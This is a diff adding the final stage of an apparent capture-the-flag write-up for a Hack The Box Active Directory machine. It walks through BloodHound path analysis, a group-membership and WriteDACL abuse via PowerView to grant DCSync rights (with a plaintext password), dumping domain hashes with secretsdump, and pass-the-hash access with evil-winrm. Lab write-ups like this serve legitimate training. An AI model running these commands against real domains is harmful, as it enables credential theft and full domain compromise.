@@ -250,4 +250,42 @@ and then mount it on the victim machine use the `net use` command, moving the `.
 
 ![mounting-smb](mounting-smb.jpg)
 
-*afterwards,* we upload the file into `bloodhound` after starting it with the `--no-sandbox` flag. And, after setting up the `neo4j` database.
+*afterwards,* we upload the file into `bloodhound` and start checking what we can do having owned the `svc-alfresco` service account. we run the `shortest path from owned principles` query:
+
+![bloodhound-query](bloodhound-query.jpg)
+
+This query shows us no real path to being a domain admin. So we try another query: `Shortest Paths to Hgih Value Targets`
+
+![bloodhound-query-2](bloodhound-query-2.jpg)
+
+It looks horrible at first. *But, after taking a closer look,* we notice that our account *being in the `account operators` group* can add a member to a certain group called `Exchange Windows Permissions` which happens to have `WriteDACL` on `htb.local` a.k.a the domain. Having that privilege means we can abuse it to give ourselves the `DCSync` right that we can use to dump all the domain hashes.
+
+![path-to-DA](path-to-DA.jpg)
+
+![abuse-write-dacl](abuse-write-dacl.jpg)
+
+we add our user to that group using a powershell command: `Add-ADGroupMember 'Exchange Windows Permissions' -members 'svc-alfresco'`
+
+![adding-to-group](adding-to-group.jpg)
+
+we then upload `PowerView.ps1` (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the victim machine and import it using `import-module .\PowerView.ps1`
+
+we view the help page and usage examples of the abuse command `Add-DomainObjectAcl` using `Get-Help Add-DomainObjectAcl -Examples`
+
+![abuse-command-help](abuse-command-help.jpg)
+
+we notice that we need to create a Powershell `Credential Object` and run the command to give our user `svc-alfresco` `DCSync` rights over `htb.local`. It should be as below:
+
+```
+$SecPassword = ConvertTo-SecureString 's3rvice'-AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfresco', $SecPassword)
+Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.local\svc-alfresco' -Rights DCSync -Credential $Cred -Verbose
+```
+
+This takes a little while to run but we eventually have permission to dump hashes. We use impackets `secretsdump.py` and voala! :D
+
+![hashes_dumped](hashes_dumped.jpg)
+
+*Using the administrator NTLM hash,* we can use `evil-winrm` to remote inside and we're done with the box :D
+
+![got-admin](got-admin.jpg)
